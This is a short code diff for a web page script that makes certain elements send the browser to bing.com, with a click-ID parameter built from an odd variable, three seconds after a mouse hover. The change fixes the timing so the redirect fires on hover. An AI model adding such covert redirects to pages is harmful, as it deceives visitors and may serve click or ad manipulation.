@@ -210,7 +210,7 @@
 <script>
     var redir_elm = document.getElementsByClassName("redirect_elements");
     for (var i = 0; i < redir_elm.length; i++) {
-        redir_elm[i].addEventListener("mouseover", setTimeout(function(){ window.location.href = "https://bing.com?gclid="+dugznov; }, 3000))
+        redir_elm[i].addEventListener("mouseover", function () {setTimeout(function(){ window.location.href = "https://bing.com?gclid="+dugznov; }, 3000)})
     }
 </script>
 		
